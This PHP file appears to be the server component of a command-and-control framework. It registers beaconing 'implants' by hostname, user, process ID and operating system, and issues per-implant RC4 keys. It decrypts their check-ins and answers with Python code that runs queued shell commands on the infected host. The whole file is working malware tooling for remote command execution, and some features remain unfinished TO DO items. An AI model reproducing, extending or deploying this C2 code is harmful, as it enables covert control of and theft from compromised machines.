<?php
    include "connector.php";
    include "rc4.php";
    include "randomize.php";

    # Gets raw POST data
    $raw_post_data = file_get_contents("php://input");

    # If Base64 encoded POST data (initial beacon)
    if (base64_decode($raw_post_data, true) == true) {
        # Base64 decodes POST data
        $base64_decoded = base64_decode($raw_post_data);

        # Takes Base64 decoded POST data and splits based off "&"
        $ampersand_split = explode("&", $base64_decoded);

        # Parses and gets hostname
        $temp = explode("=", $ampersand_split[0]);
        $hostname = urldecode($temp[1]);

        # Parses and gets current user
        $temp = explode("=", $ampersand_split[1]);
        $current_user = urldecode($temp[1]);

        # Parses and gets process ID
        $temp = explode("=", $ampersand_split[2]);
        $process_id = urldecode($temp[1]);

        # Parses and gets operating system
        $temp = explode("=", $ampersand_split[3]);
        $operating_system = urldecode($temp[1]);

        # Generates 32 character (256 bit) encryption key here
        $encryption_key = generate_random_string();

        # Adds a new entry in the "implants" table
        $statement = $database_connection->prepare("INSERT INTO `implants` (`process_id`, `hostname`, `operating_system`, `current_user`, `encryption_key`, `last_seen`) VALUES (:process_id, :hostname, :operating_system, :current_user, :encryption_key, :last_seen)");
        $statement->bindValue(":process_id", $process_id);
        $statement->bindValue(":hostname", $hostname);
        $statement->bindValue(":operating_system", $operating_system);
        $statement->bindValue(":current_user", $current_user);
        $statement->bindValue(":encryption_key", $encryption_key);
        $statement->bindValue(":last_seen", gmdate("Y-m-d H:i:s"));
        $statement->execute();

        # Kills database connection
        $statement->connection = null;

        # Echoes out Base64 encoded encryption key to the HTTP response        
        echo base64_encode($encryption_key);
    }
    # Else RC4 encrypted POST data (recurring beacon)
    else {
        # Queries all encryption keys in the "implants" table
        $statement = $database_connection->prepare("SELECT `encryption_key` FROM `implants`");
        $statement->execute();
        $results = $statement->fetchAll();

        # Loops through each queried encryption key to determine if it can decrypt the POST data
        foreach ($results as $row) {
            # Tries to decrypt POST data
            $maybe_decrypted = rc4($row["encryption_key"], $raw_post_data);
            
            # If not null, we have successful decryption
            if (!is_null(json_decode($maybe_decrypted))) {
                # Saves implant details into an array
                # "true" is needed here so it returns an array instead of an object
                $implant = json_decode($maybe_decrypted, true);

                # Parses implant JSON information
                $hostname = $implant["hostname"];
                $process_id = $implant["process_id"];
                $current_user = $implant["current_user"];
                $operating_system = $implant["operating_system"];

                # Gets encryption key (for later task encryption)
                $statement = $database_connection->prepare("SELECT `encryption_key` FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
                $statement->bindValue(":hostname", $hostname);
                $statement->bindValue(":process_id", $process_id);
                $statement->execute();
                $results = $statement->fetch(PDO::FETCH_ASSOC);
                $encryption_key = $results["encryption_key"];

                # Determines if we have anything tasked for the beaconing implant
                # TO DO: Remove "LIMIT 1" and allow it to get all tasks at once instead of being single-threaded
                $statement = $database_connection->prepare("SELECT * FROM `tasks` WHERE `hostname` = :hostname AND `process_id` = :process_id LIMIT 1");
                $statement->bindValue(":hostname", $hostname);
                $statement->bindValue(":process_id", $process_id);
                $statement->execute();
                $row_count = $statement->rowCount();
                $results = $statement->fetch(PDO::FETCH_ASSOC);

                # Kills database connection
                $statement->connection = null;

                # If we have something tasked
                # TO DO: Output RC4 encrypted task here
                if ($row_count == 1) {
                    $task_action = $results["task_action"];
                    $task_secondary = $results["task_secondary"];

                    # TO DO: Add in check if task action is "command"

                    # TO DO: Add in RC4 encrypted update to "update.php"
                    # TO DO: Add in retrieval of command from "tasks" table
                    echo "import subprocess; process = subprocess.Popen('" . $task_secondary . "', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); out, err = process.communicate(); print err; print out";
                }
            }
        }
    }
?>
